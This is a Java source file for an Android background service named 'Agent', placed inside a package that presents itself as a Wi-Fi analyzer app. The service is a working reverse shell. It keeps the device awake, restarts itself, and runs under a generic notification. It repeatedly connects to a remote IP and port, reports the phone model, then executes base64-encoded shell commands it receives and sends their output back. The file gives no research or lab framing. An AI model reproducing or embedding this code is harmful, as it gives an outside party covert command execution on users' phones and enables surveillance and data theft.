package com.network.wifianalyzer;

import android.app.Service;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.os.Build;
import android.os.IBinder;
import android.os.PowerManager;
import android.content.Intent;
import android.util.Base64;
import java.io.*;
import java.net.Socket;

public class Agent extends Service {
    String SERVER = "192.168.1.41"; 
    int PORT = 9999;
    PowerManager.WakeLock wakeLock;

    @Override
    public int onStartCommand(Intent i, int f, int s) {
        PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "WiFi:Agent");
        wakeLock.acquire();

        if (Build.VERSION.SDK_INT >= 26) {
            NotificationChannel channel = new NotificationChannel("1", "Service", NotificationManager.IMPORTANCE_LOW);
            ((NotificationManager) getSystemService(NOTIFICATION_SERVICE)).createNotificationChannel(channel);
            Notification notif = new Notification.Builder(this, "1").setContentTitle("Service Running").build();
            startForeground(1, notif);
        }

        new Thread(new Runnable() { public void run() { loop(); } }).start();
        return START_STICKY;
    }

    void loop() {
        while (true) {
            try {
                Socket sock = new Socket(SERVER, PORT);
                BufferedReader in = new BufferedReader(new InputStreamReader(sock.getInputStream()));
                PrintWriter out = new PrintWriter(sock.getOutputStream(), true);
                out.println("Connected: " + android.os.Build.MODEL);
                
                String cmd;
                while ((cmd = in.readLine()) != null) {
                    String decoded = new String(Base64.decode(cmd, Base64.DEFAULT));
                    out.println("$ " + decoded);
                    try {
                        Process p = Runtime.getRuntime().exec(new String[]{"sh", "-c", decoded});
                        BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
                        StringBuilder sb = new StringBuilder();
                        String l;
                        while ((l = r.readLine()) != null) sb.append(l).append("\n");
                        p.waitFor();
                        out.println(sb.toString());
                    } catch (Exception e) { out.println("Error: " + e.getMessage()); }
                }
                sock.close();
            } catch (Exception e) {
                try { Thread.sleep(5000); } catch (Exception x) {}
            }
        }
    }

    @Override
    public IBinder onBind(Intent i) { return null; }
}
